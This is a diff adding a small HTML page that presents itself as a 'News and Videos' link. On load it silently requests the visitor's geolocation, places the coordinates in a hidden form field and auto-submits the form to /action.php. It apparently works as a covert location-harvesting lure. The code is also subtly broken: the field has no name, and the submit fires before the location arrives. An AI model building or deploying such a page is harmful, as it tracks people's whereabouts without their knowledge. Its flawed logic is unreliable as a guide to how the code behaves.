@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<body onload="getLocation(), document.frm1.submit()">
+
+<a href="https://www.youtube.com">News and Videos.</a>
+
+<p id="demo"></p>
+
+<form action="/action.php" method="POST" name="frm1">
+    <input type="hidden" id="inputId">
+</form>
+
+<script>
+var x = document.getElementById("inputId");
+
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+    } else { 
+        x.value = "Geolocation is not supported by this browser.";
+    }
+}
+
+function showPosition(position) {
+    x.value = "Latitude: " + position.coords.latitude + 
+    "<br>Longitude: " + position.coords.longitude;
+}
+</script>
+
+</body>
+</html>
